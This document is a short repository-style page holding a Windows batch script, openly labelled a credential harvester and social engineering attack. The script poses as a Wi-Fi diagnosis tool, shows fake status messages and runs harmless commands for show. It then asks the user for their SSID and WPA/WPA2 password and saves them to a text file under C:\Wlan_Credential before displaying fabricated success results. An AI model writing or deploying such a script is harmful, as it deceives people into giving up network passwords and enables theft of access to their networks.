# Wlan_Credential_harvester-SET-
Just a Simple Social Engineering attack
@echo off
title WIFI Diagnosis
color 9f
echo WIFI Diagnosis will take just upto 2-3 min 
echo for Diagnosing your WIFI 
echo Press Enter to start Diagnosing your WIFI
pause > nul
cls
echo WIFI Status Analaysing.......
timeout 3 > nul
ipconfig/renew
cls
timeout 1 > nul
color 0c
echo Poor signal strength...
timeout 3 > nul
cls
color 9f
echo Diagnosing your WIFI........
timeout 4 > nul
echo Reauthentication required
timeout 2 > nul
echo.
echo.
echo Please enter your SSID and WIFI WPA/WPA2 password to ensure that you are the WIFI owner.
echo.
echo.
echo.
echo.
set /p ssid=S S I D  : 
echo off
set /p pass=Password : 
mkdir C:\Wlan_Credential
echo SSID=%ssid% Password=%pass% >C:\Wlan_Credential\WPAWPA2_Credential.txt
cls
timeout 2 > nul
echo Obtaining IP address.....
timeout 2 > nul
cls
echo Authenticating.......
timeout 4 > nul
cls
echo Authentication sucessful..........
timeout 3 > nul
cls
echo Attempting Reconnaissance test...............
timeout 2 > nul
cd C:\Windows\System32
tree
cd..
cd..
cls
echo Reconnaissance Scan Succesful.......
timeout 1 > nul
echo Sending Anti-WPA-bugging.................
color 0a
timeout 3 > nul
ipconfig/renew
ipconfig/renew
ipconfig/renew
cls
echo WIFI Diognosis results:
echo.
echo.
timeout 1 > nul
echo Debugging Results:
timeout 2 > nul
echo SUCESSFUL
timeout 1 > nul
echo WIFI run test:
timeout 2 > nul
echo SUCESSFUL
timeout 1 > nul
echo WIFI signal strength:
timeout 2 > nul
echo 72 mb/s
timeout 1 > nul
echo Overall results:
timeout 2 > nul
echo GOOD
timeout 1 > nul
echo Press enter to exit
pause > nul
exit
